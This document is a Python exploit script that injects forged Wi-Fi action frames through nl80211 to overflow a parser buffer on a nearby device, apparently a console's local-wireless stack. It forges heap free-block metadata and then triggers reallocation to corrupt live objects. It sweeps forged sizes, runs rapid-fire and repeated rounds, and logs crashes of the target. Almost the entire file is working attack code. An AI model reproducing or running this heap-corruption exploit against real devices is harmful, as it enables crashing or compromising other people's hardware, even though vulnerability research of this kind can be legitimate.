#!/usr/bin/env -S python3 -u
"""Two-stage heap corruption attack via forged free block metadata.

Stage 1: Send overflow frames that forge the free block at parser+0x7AC
  with a LARGE size (0x40000). When the parser is freed (500ms timeout),
  the allocator coalesces the parser block with the forged "large" free
  block, creating a free block that extends past actual heap boundaries.

Stage 2: Immediately trigger a second join request. The new parser is
  allocated from the corrupted heap. If the corrupted free list caused
  an overlapping allocation, the second body copy writes to live objects.

CRITICAL FINDING: Parser allocation is only 0x48 bytes (not 0x5D8!).
Body copy to parser+0x5C starts 0x14 bytes PAST the parser end.
The ENTIRE body overwrites adjacent heap memory.
"""

import os
import struct
import socket
import time
import subprocess
import json
from pathlib import Path

_LDN_ROOT = Path(__file__).resolve().parent.parent.parent
IFACE = "wlp5s0"
SWITCH_MAC = bytes.fromhex("ecc40df3dcdb")
SRC_MAC = bytes.fromhex("227ccee0bd56")
FREQ = 2412
LP2P_HEADER = b"\x7f\x00\x22\xaa\x04\x01\x01\x01\x00\x00\x00\x00"


def get_nl80211_family():
    s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, 16)
    pid = os.getpid() + 100
    s.bind((pid, 0))
    name = b'nl80211\x00'
    nla_b = struct.pack('HH', 4 + len(name), 2) + name
    if len(nla_b) % 4:
        nla_b += b'\x00' * (4 - len(nla_b) % 4)
    p = struct.pack('BBH', 3, 1, 0) + nla_b
    s.sendto(struct.pack('IHHII', 16 + len(p), 0x10, 3, 1, pid) + p, (0, 0))
    data = s.recv(8192)
    s.close()
    off = 20
    nllen = struct.unpack_from('I', data, 0)[0]
    while off < nllen:
        nla_len, nla_type = struct.unpack_from('HH', data, off)
        if nla_type == 1:
            return struct.unpack_from('H', data, off + 4)[0]
        off += (nla_len + 3) & ~3
    raise RuntimeError("nl80211 family not found")


def nla(t, d):
    if isinstance(d, int):
        d = struct.pack('I', d)
    n = struct.pack('HH', 4 + len(d), t) + d
    if len(n) % 4:
        n += b'\x00' * (4 - len(n) % 4)
    return n


def send_frame(fam_id, ifindex, frame_bytes):
    s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, 16)
    pid = os.getpid() + 500 + (hash(frame_bytes[:16]) & 0xFFFF)
    s.bind((pid, 0))
    s.settimeout(2.0)
    genlhdr = struct.pack('BBH', 59, 0, 0)
    nla_data = nla(3, ifindex) + nla(38, FREQ) + nla(51, frame_bytes)
    payload = genlhdr + nla_data
    nlhdr = struct.pack('IHHII', 16 + len(payload), fam_id, 1 | 4, 99999, pid)
    try:
        s.sendto(nlhdr + payload, (0, 0))
        resp = s.recv(16384)
        _, msg_type = struct.unpack_from('IH', resp, 0)
        if msg_type == 2:
            err = struct.unpack_from('i', resp, 16)[0]
            s.close()
            return err
        s.close()
        return 0
    except socket.timeout:
        s.close()
        return -110
    except Exception as e:
        s.close()
        return str(e)


def build_frame(body):
    frame = bytearray()
    frame += struct.pack('<H', 0x00D0)
    frame += b"\x00\x00"
    frame += SWITCH_MAC
    frame += SRC_MAC
    frame += SWITCH_MAC
    frame += struct.pack('<H', 0x0000)
    frame += LP2P_HEADER
    frame += body
    return bytes(frame)


def build_stage1_body(free_size):
    """Stage 1: forge the free block size at parser+0x7AC."""
    body_size = 0x800
    body = bytearray(body_size)
    body[0x21] = 0x03
    struct.pack_into(">H", body, 0x22, body_size - 0x38)
    body[0x26] = 0x01
    body[0x27] = 0x01
    struct.pack_into(">H", body, 0x1DA, 0x0100)

    # Fill overflow with 0x41 (identifiable pattern)
    for i in range(0x57C, body_size):
        body[i] = 0x41

    # Forge free block header at body[0x750:0x768]
    struct.pack_into("<H", body, 0x750, 0x4652)   # magic FR
    struct.pack_into("<H", body, 0x752, 0x0001)   # attr
    struct.pack_into("<I", body, 0x754, free_size) # FORGED size
    struct.pack_into("<Q", body, 0x758, 0)         # prev = NULL
    struct.pack_into("<Q", body, 0x760, 0)         # next = NULL

    return bytes(body)


def build_stage2_body():
    """Stage 2: minimal valid body to trigger parser allocation."""
    body_size = 0x100
    body = bytearray(body_size)
    body[0x21] = 0x03
    struct.pack_into(">H", body, 0x22, body_size - 0x38)
    body[0x26] = 0x01
    body[0x27] = 0x01
    return bytes(body)


def build_stage2_large_body():
    """Stage 2 with large body to trigger body copy overflow again."""
    body_size = 0x800
    body = bytearray(body_size)
    body[0x21] = 0x03
    struct.pack_into(">H", body, 0x22, body_size - 0x38)
    body[0x26] = 0x01
    body[0x27] = 0x01
    struct.pack_into(">H", body, 0x1DA, 0x0100)
    # Fill with 0xBB pattern (stage 2 marker)
    for i in range(0x57C, body_size):
        body[i] = 0xBB
    # DON'T fix the free header - if the heap is corrupted,
    # the free block might be at a different location
    return bytes(body)


def check_alive():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect(('192.168.0.1', 80))
        s.sendall(b'GET / HTTP/1.1\r\nHost: 192.168.0.1\r\n\r\n')
        d = s.recv(512)
        s.close()
        return b'HTTP/' in d
    except Exception:
        return False


def wait_alive(timeout=30):
    start = time.time()
    while time.time() - start < timeout:
        if check_alive():
            return True
        time.sleep(2)
    return False


def main():
    ifindex = socket.if_nametoindex(IFACE)
    fam_id = get_nl80211_family()
    print(f"Interface: {IFACE}, nl80211 family: {fam_id}")

    results = []

    # Test various forged sizes with two-stage attack
    for free_size_name, free_size, stage2_body_fn in [
        ("baseline_0x20_small", 0x20, build_stage2_body),
        ("baseline_0x20_large", 0x20, build_stage2_large_body),
        ("forge_0x1000_small", 0x1000, build_stage2_body),
        ("forge_0x1000_large", 0x1000, build_stage2_large_body),
        ("forge_0x10000_small", 0x10000, build_stage2_body),
        ("forge_0x10000_large", 0x10000, build_stage2_large_body),
        ("forge_0x40000_small", 0x40000, build_stage2_body),
        ("forge_0x40000_large", 0x40000, build_stage2_large_body),
    ]:
        if not check_alive():
            if not wait_alive(30):
                print(f"  {free_size_name:50s} → SKIP")
                results.append({"name": free_size_name, "result": "SKIP"})
                continue

        print(f"\n  === {free_size_name} ===")

        # Stage 1: forge heap metadata
        stage1 = build_stage1_body(free_size)
        frame1 = build_frame(stage1)

        print(f"  Stage 1: Sending 80 overflow frames (forge size=0x{free_size:x})...")
        for i in range(80):
            send_frame(fam_id, ifindex, frame1)
            time.sleep(0.002)

        # Wait for join timeout + parser free
        print(f"  Waiting 2s for parser free...")
        time.sleep(2)

        # Verify still alive before stage 2
        mid_alive = check_alive()
        print(f"  Mid-check: {'alive' if mid_alive else 'DEAD'}")
        if not mid_alive:
            ping = subprocess.run(['ping', '-c', '1', '-W', '2', '192.168.0.1'],
                                   capture_output=True).returncode == 0
            if not ping:
                print(f"  {free_size_name:50s} → CRASH (stage 1)")
                results.append({"name": free_size_name, "result": "CRASH_S1"})
                time.sleep(15)
                wait_alive(30)
                continue

        # Stage 2: trigger new parser allocation from corrupted heap
        stage2 = stage2_body_fn()
        frame2 = build_frame(stage2)

        print(f"  Stage 2: Sending 80 frames (body={len(stage2):#x})...")
        for i in range(80):
            err = send_frame(fam_id, ifindex, frame2)
            if err != 0:
                break
            time.sleep(0.002)

        # Wait for second join timeout
        time.sleep(2)

        # Check results
        post_alive = check_alive()
        time.sleep(3)
        post_alive2 = check_alive()
        ping = subprocess.run(['ping', '-c', '1', '-W', '2', '192.168.0.1'],
                               capture_output=True).returncode == 0

        if post_alive2 and ping:
            result = "OK"
        elif ping and not post_alive2:
            result = "HTTP_DOWN"
        else:
            result = "CRASH_S2"

        print(f"  {free_size_name:50s} → {result}")
        results.append({"name": free_size_name, "free_size": free_size,
                         "result": result, "mid_alive": mid_alive})
        if result != "OK":
            time.sleep(15)
            wait_alive(30)

    # Phase 2: Rapid fire - no pause between stages
    print(f"\n{'='*65}")
    print("  RAPID FIRE: Stage 1 → immediate Stage 2 (no pause)")
    print("="*65)

    for free_size_name, free_size in [
        ("rapid_0x10000", 0x10000),
        ("rapid_0x40000", 0x40000),
        ("rapid_0x80000", 0x80000),
    ]:
        if not check_alive():
            if not wait_alive(30):
                print(f"  {free_size_name:50s} → SKIP")
                results.append({"name": free_size_name, "result": "SKIP"})
                continue

        stage1 = build_stage1_body(free_size)
        frame1 = build_frame(stage1)
        stage2 = build_stage2_large_body()
        frame2 = build_frame(stage2)

        # Interleave stage 1 and stage 2 frames rapidly
        print(f"  {free_size_name}: Sending 80 S1 + 80 S2 back-to-back...")
        for i in range(80):
            send_frame(fam_id, ifindex, frame1)
            time.sleep(0.001)
        # Tiny gap - just enough for the join handler to timeout
        time.sleep(0.6)
        for i in range(80):
            send_frame(fam_id, ifindex, frame2)
            time.sleep(0.001)

        time.sleep(3)
        alive = check_alive()
        time.sleep(3)
        alive2 = check_alive()
        ping = subprocess.run(['ping', '-c', '1', '-W', '2', '192.168.0.1'],
                               capture_output=True).returncode == 0

        if alive2 and ping:
            result = "OK"
        elif ping:
            result = "HTTP_DOWN"
        else:
            result = "CRASH"

        print(f"  {free_size_name:50s} → {result}")
        results.append({"name": free_size_name, "free_size": free_size, "result": result})
        if result != "OK":
            time.sleep(15)
            wait_alive(30)

    # Phase 3: Many rounds to accumulate corruption
    print(f"\n{'='*65}")
    print("  ACCUMULATION: 5 rounds of forge+trigger")
    print("="*65)

    if not check_alive():
        wait_alive(30)

    for round_num in range(5):
        stage1 = build_stage1_body(0x40000)
        frame1 = build_frame(stage1)
        stage2 = build_stage2_large_body()
        frame2 = build_frame(stage2)

        # Stage 1
        for i in range(80):
            send_frame(fam_id, ifindex, frame1)
            time.sleep(0.001)
        time.sleep(0.8)
        # Stage 2
        for i in range(80):
            send_frame(fam_id, ifindex, frame2)
            time.sleep(0.001)
        time.sleep(0.8)

        alive = check_alive()
        ping = subprocess.run(['ping', '-c', '1', '-W', '2', '192.168.0.1'],
                               capture_output=True).returncode == 0
        status = "OK" if alive and ping else "HTTP_DOWN" if ping else "CRASH"
        print(f"  Round {round_num+1}/5: {status}")

        if status != "OK":
            print(f"  *** CRASH/DOWN at round {round_num+1}! ***")
            results.append({"name": f"accumulation_round_{round_num+1}", "result": status})
            break
    else:
        print("  All 5 rounds survived.")
        results.append({"name": "accumulation_5_rounds", "result": "OK"})

    # Summary
    print(f"\n{'='*65}")
    print("  SUMMARY")
    print("="*65)
    for r in results:
        marker = " ***" if r.get("result") not in ("OK", None) else ""
        print(f"  {r.get('name','?'):50s} → {r.get('result','?')}{marker}")

    outfile = str(_LDN_ROOT / "evidence" / "action_frame_overflow" / "two_stage_heap.json")
    with open(outfile, "w") as f:
        json.dump({"timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ"), "results": results}, f, indent=2)
    print(f"\n  Saved to {outfile}")


if __name__ == "__main__":
    main()
